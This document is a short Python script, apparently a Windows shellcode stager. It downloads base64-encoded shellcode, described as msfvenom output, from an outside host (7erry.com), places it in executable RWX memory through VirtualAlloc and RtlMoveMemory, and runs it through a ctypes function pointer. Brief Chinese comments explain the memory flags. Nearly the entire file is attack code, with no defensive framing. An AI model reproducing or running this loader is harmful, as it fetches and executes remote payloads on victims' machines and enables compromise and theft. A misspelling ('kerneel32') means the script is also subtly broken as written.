'''
:P
'''
from urllib import request
import base64
import ctypes

kernel32 = ctypes.windll.kerneel32
def get_code(url="http://7erry.com/shellcode.bin")->bytes:
    '''download our shellcode'''
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    '''create buffer to store and execute shellcode'''
    length = len(buf)
    #! 指定memcpy时的参数为两个指针和一个size对象
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )
    #! 0x40表明该内存为RWX段
    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40)
    kernel32.RtlMoveMemory(ptr,buf,length)
    return ptr

def run(shellcode):
    '''run shellcode generated by msfvenom'''
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    #! DS指针改为CS指针
    shell_func = ctypes.cast(ptr,ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == "__main__":
    url =  "http://7erry.com/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)